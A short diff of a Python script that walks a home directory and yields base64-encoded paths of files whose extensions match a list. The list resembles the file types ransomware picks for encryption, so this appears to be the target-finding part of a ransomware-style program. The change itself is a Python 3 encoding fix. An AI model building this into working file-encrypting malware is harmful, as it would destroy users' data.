@@ -28,7 +28,7 @@ SXC': 0, '.OTS': 0, '.ODS': 0, '.3DM': 0, '.MAX': 0, '.3DS': 0, '.UOT': 0, '.STW
         for arq in files_found:
             extensao = os.path.splitext(os.path.join(actual_path, arq))[1].upper()
             if(file_format.get(extensao) == 0 or extensao == ''):
-                yield base64.b64encode(os.path.join(actual_path, arq))
+                yield base64.b64encode(os.path.join(actual_path, arq).encode())
 
 if __name__  == "__main__":
     for x in find_files('/home/tarcisio/'):
